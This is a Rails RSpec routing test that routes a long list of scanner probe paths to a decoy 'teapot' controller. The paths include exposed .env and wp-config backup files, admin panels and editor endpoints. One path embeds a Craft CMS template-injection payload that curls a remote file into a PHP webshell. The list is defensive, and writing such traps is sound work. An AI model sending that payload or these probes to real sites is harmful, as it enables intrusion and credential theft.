require 'rails_helper'

# rubocop:disable Layout/LineLength
GET_PATHS = %w[
  .ftpconfig
  /!==this.readyState
  /.env
  /.git
  //bitrix/admin//admin/
  /00/admin/
  /01/admin/
  /02/admin/
  /03/admin/
  /1
  /1/admin/
  /10/admin/
  /100/admin/
  /1000/admin/
  /123/admin/
  /2/admin/
  /200/admin/
  /2001/admin/
  /2002/admin/
  /2004/admin/
  /2005/admin/
  /2018
  /2019
  /2019/wp-includes/wlwmanifest.xml
  /2020
  /2020/wp-includes/wlwmanifest.xml
  /2021
  /2022
  /360/static/js/iku.js
  /@/admin/
  /App_master/Telerik.Web.UI.WebResource.axd?type=rau
  /Content/Wap/base.css
  /Content/common/web/CommonActivity.css
  /Content/css/wzwstylel.css
  /DesktopModules/Admin/RadEditorProvider/DialogHandler.aspx
  /FCKeditor/editor/filemanager/connectors/test.html
  /Home/Bind/binding
  /Home/GetAllGameCategory
  /Home/Index/ajaxTJ
  /Install/InstallWizard.aspx?__VIEWSTATE=
  /Login
  /Pc/Lang/index.html
  /Promotions/list.mvc
  /Public/Home/images/game/pk10.png
  /Public/Home/js/cls.js
  /Public/Home/js/common.js
  /Public/Mobile/ecshe_css/wapmain.css?v=1545408652
  /Public/Wchat/css/index.css
  /Public/css/errorCss.css
  /Public/css/hall.css
  /Public/home/common/js/index.js
  /Public/home/js/check.js
  /Public/home/wap/css/qdgame.css
  /Public/js/common.js
  /Public/mobile/js/config.js
  /Scripts/common.js
  /Security/login
  /Telerik.Web.UI.WebResource.axd?type=rau
  /Template/Mobile/js/main.js
  /Templates/user/finance/css/userPay.css
  /Templates/user/js/global.js
  /_profiler/phpinfo
  /_wpeprivate/config.json
  /aa/admin/
  /aaa/admin/
  /abc/admin/
  /about/admin/
  /academic/admin/
  /access/admin/
  /accessgranted/admin/
  /action/admin/
  /actions/seomatic/meta-container/all-meta-containers?uri=%7B%7Bcraft.app.view.evaluateDynamicContent%28%27print%28system%28%22curl+https%3A%2F%2Fcxtreme.rbow.site%2Fedit.txt+%3E+hank.php%22%29%29%3B%27%29%7D%7D
  /actuator/env
  /adm
  /adm/admin/
  /admin
  /admin/new
  /admin_/admin/
  /administrator
  /administrator/admin/
  /administrator/language/en-GB/en-GB.xml
  /adminlogin/admin/
  /ajax
  /ajax/allcoin_a/id/0?t=0.3782499195965951
  /analytics/jbips/
  /api.py
  /api/ApiHub/fetchJinse
  /api/Index/getLottery
  /api/common/getConfig
  /api/config-init
  /api/contactWay
  /api/customerServiceLink
  /api/exclude/siteConfig/webSiteConfig
  /api/index/webconfig
  /api/mobile/checkStrategyHistory
  /api/product/topRank?token=null&uid=null&lang=null&direct=1&type=1
  /api/public
  /api/stock/getSingleStock.do
  /api/uploads/apimap
  /api/user/get_user_group
  /api/v/index/queryOfficePage?officeCode=customHomeLink
  /api/v1/about
  /api/wallet/redDetail
  /apis/api/index
  /app/common/getRegisterSet
  /app_master/telerik.web.ui.dialoghandler.aspx
  /appxz/index.html
  /assets/app-manifest.json
  /assets/dist/static/js/vendor_prod.js
  /assets/extension/market/css/mt4.css
  /assets/res/mods/room.js
  /assets/room/css/room_mobile.css
  /auth
  /auth/login/admin/
  /aws.yml
  /backup
  /bak
  /base/exchange_article/index/classid/1/id/1
  /base/exchange_index/changepwdfirst
  /bc
  /bk
  /blog
  /blog/wp-includes/wlwmanifest.xml
  /cache
  /cdn-cgi/foobar
  /cgi-bin/fubar
  /client/api/findConfigByKey?configKey=level_config
  /client/api/findFreeTrade
  /cms
  /cms/wp-includes/wlwmanifest.xml
  /common/member/js/user.util.js
  /common/template/lottery/lecai/css/style.css
  /components/swim
  /config.js
  /config/aws.yml
  /contact
  /contacts
  /cscpLoginWeb/app/home
  /csjs/bankCheck.js
  /css/all.css
  /css/app.css
  /css/main.css
  /css/nsc/reset.css
  /css/view/main/goin.css
  /css/view/main/style.css
  /data/json/config.json
  /demo/
  /demo/index.php/admin/
  /demo/rss/catalog/notifystock
  /demo/rss/catalog/review
  /demo/rss/order/new
  /dev/
  /dev/index.php/admin/
  /dev/rss/catalog/notifystock
  /dev/rss/catalog/review
  /dev/rss/order/new
  /downloader
  /env
  /fckeditor/editor/filemanager/connectors/test.html
  /files/
  /files/pub_rem.js
  /foo/phpunit/bar
  /friendGroup/list
  /gaocc/g445g
  /getConfig/listPopFrame.do
  /h5/
  /home/GetQrCodeInfo
  /home/login/login_index.html
  /homes/
  /html/js/editor/fckeditor/editor/filemanager/connectors/test.html
  /iframe/rankgiftgotapi/1005
  /im/
  /im/App/config
  /im/h5/
  /im/in/GetUuid
  /images/
  /images/no.jpg
  /images/src_images_but_dianz_s.png
  /include/fckeditor/editor/filemanager/connectors/test.html
  /index.php/admin/
  /index/Mobile/fenshi?code=sz002405
  /index/Mobile/kline_week
  /index/index/purchase.html
  /index/login/register
  /infe/rest/fig/advertise/common.json?mobile_open=1
  /infe/rest/flash/getServerIP.json
  /install/
  /ipl/app/flash/publicbmw/ball/FigLeaf.js?site=member
  /jiaoyimao/default.css
  /js/basic.js
  /js/common.js
  /js/fckeditor/editor/filemanager/connectors/test.html
  /js/home.js
  /js/mage/cookies.js
  /json/configs/permanent/permanent-lottery-config-list.json
  /kkrps/im_group/show_members
  /kkrps/im_group/showmembers
  /langConfig.js
  /lanren/css/global.css
  /laravel/.env
  /lib/client/etc/hometu.jpg
  /loan
  /login
  /login.asp
  /login.html
  /m/
  /m/ticker/usdtqc
  /magento/index.php/admin/
  /magento/rss/catalog/notifystock
  /magento/rss/catalog/review
  /magento/rss/order/new
  /magento_version
  /main
  /manager/
  /market/getStockBaseInfo?stockCodeInternal=2658
  /market/market-ws/iframe.html
  /member/js/lang_zh_CN.js
  /n/news/banner?column_id=303
  /new
  /new-site
  /news/wp-includes/wlwmanifest.xml
  /nyyh/game.css
  /oc/admin/
  /old-site
  /old-wp
  /old/
  /old/index.php/admin/
  /old/rss/catalog/notifystock
  /old/rss/catalog/review
  /old/rss/order/new
  /oldsite
  /otc/
  /pages/admin
  /pages/console/js/common.js
  /phpMyAdmin
  /phpinfo
  /phpmyadmin/fubar
  /plugins/fubar
  /portal/index/protocol.html
  /providers/htmleditorproviders/telerik/telerik.web.ui.dialoghandler.aspx
  /proxy/games
  /proxy/settings
  /public/.env
  /public/appapi/images/error.jpg
  /public/h5static/js/main.js
  /public/static/css/denglu.css
  /public/static/home/js/moblie/login.js
  /public/tpl/default/static/css.css
  /public/web/css/add//index.css
  /public/web/js/add/com.js
  /resources/css/headernav.css
  /resources/main/common.js
  /room/getRoomBangFans
  /room/script/face.js
  /rss/catalog/notifystock
  /rss/catalog/review
  /rss/order/new
  /s_api/basic/config_js?callback=__set_config
  /s_api/basic/download/info
  /sftp-config.json
  /shop/index.php/admin/
  /shop/rss/catalog/notifystock
  /shop/rss/catalog/review
  /shop/rss/order/new
  /simpla/
  /site.js
  /site/
  /site/admin/
  /site/get-hq?proNo=btc&panType=1&pid=1
  /site/wp-includes/wlwmanifest.xml
  /sites/all/libraries/fckeditor/editor/filemanager/connectors/test.html
  /sites/all/modules/fckeditor/fckeditor/editor/filemanager/connectors/test.html
  /sites/default/files/
  /sito/wp-includes/wlwmanifest.xml
  /skin/main/onload.js
  /staging/index.php/admin/
  /staging/rss/catalog/notifystock
  /staging/rss/catalog/review
  /staging/rss/order/new
  /static/admincp/js/common.js
  /static/common/js/common.js
  /static/common/js/global.js
  /static/css/index.css
  /static/data/gamedatas.js
  /static/data/thirdgames.json
  /static/download/style.css
  /static/guide/ab.css
  /static/h5/img/icon__create-group.png
  /static/home/css/css.css
  /static/home/css2/login--1.css
  /static/home/js/rooms.js
  /static/home/static/js/login.js
  /static/index/css/iindex.css
  /static/index/js/lk/order.js
  /static/mobile/user.html
  /static/wap/css/index.css
  /static/wap/js/common.js
  /static/xianyu/js/bankCheck.js
  /statics/js/API.js
  /stock/search.html?keyword=00202
  /storage/.env
  /store/index.php/admin/
  /store/rss/catalog/notifystock
  /store/rss/catalog/review
  /store/rss/order/new
  /temp/
  /template/920ka/css/lsy.css
  /template/920ka/js/woodyapp.js
  /template/js/comm/Confrim.js
  /test/
  /test/index.php/admin/
  /test/rss/catalog/notifystock
  /test/rss/catalog/review
  /test/rss/order/new
  /tmp/
  /uploads/
  /user/admin/
  /user/userlist
  /v1/
  /v1/management/tenant/getSpeedDomain
  /v2/
  /vendor/.env
  /views/commData/commonSite.js
  /wap/api/exchangerateuserconfig!get.action
  /wap/trading/get_newallorder_ajax
  /web/
  /web/api/getBanner
  /web/wp-includes/wlwmanifest.xml
  /webadmin
  /website/wp-includes/wlwmanifest.xml
  /wordpress
  /wordpress/wp-includes/wlwmanifest.xml
  /wp
  /wp-admin
  /wp-admin/css/
  /wp-booking.php
  /wp-config-backup.txt
  /wp-config-good
  /wp-config.bak
  /wp-config.good
  /wp-config.php-bak
  /wp-config.php-original
  /wp-config.php_
  /wp-config.php_1
  /wp-config.php_Old
  /wp-config.php_bak
  /wp-config.php_new
  /wp-config.php_orig
  /wp-config.php_original
  /wp-config.phporiginal
  /wp-config.php~
  /wp-config_good
  /wp-content/
  /wp-content/mu-plugins/db-safe-mode.php
  /wp-content/plugins/wpdiscuz/themes/default/style-rtl.css
  /wp-includes/css/wp-config.php
  /wp-includes/wlwmanifest.xml
  /wp-json
  /wp-json/wp/v2/users
  /wp/wp-includes/wlwmanifest.xml
  /wp1
  /wp1/wp-includes/wlwmanifest.xml
  /wp2
  /wp2/wp-includes/wlwmanifest.xml
  /ws/index/getTheLotteryInitList
  /www.rar
  /www.sql
  /www.sql.gz
  /www.sql.zon
  /xianyu/index/setp1.html
  /xmlrpc.php
  /xxsssseee
  /xy/
].freeze
# rubocop:enable Layout/LineLength

POST_PATHS = %w[
  /
  /api/system/system/config/get
  /auth/oauth/token
  /index.php/api/other/appSetting
  /melody/api/v1/pageconfig/list
  /user/getAllNicknames
  /wp-booking.php
  /wp-content/mu-plugins/db-safe-mode.php
  /wp-includes/css/wp-config.php
].freeze

DELETE_PATHS = %w[
  /contacts
].freeze

RSpec.describe "teapot routes", type: :routing do
  GET_PATHS.each do |path|
    it "routes GET #{path} to the teapot controller" do
      expect(get(path)).to route_to('iron_teapot/teapots#coffee')
    end
  end

  POST_PATHS.each do |path|
    it "routes POST #{path} to the teapot controller" do
      expect(post(path)).to route_to('iron_teapot/teapots#coffee')
    end
  end

  DELETE_PATHS.each do |path|
    it "routes DELETE #{path} to the teapot controller" do
      expect(delete(path)).to route_to('iron_teapot/teapots#coffee')
    end
  end
end
